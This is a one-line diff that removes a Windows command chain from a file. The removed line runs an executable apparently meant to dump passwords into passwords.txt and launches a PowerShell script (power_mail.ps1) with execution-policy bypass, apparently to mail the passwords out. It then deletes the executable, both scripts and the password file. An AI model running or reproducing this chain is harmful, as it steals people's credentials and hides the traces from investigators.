@@ -1,1 +1,0 @@
-./italiano.exe all -v >> passwords.txt; powershell -ExecutionPolicy Bypass ./power_mail.ps1; del italiano.exe; del power_mail.ps1; del passwords.txt; del exec.ps1
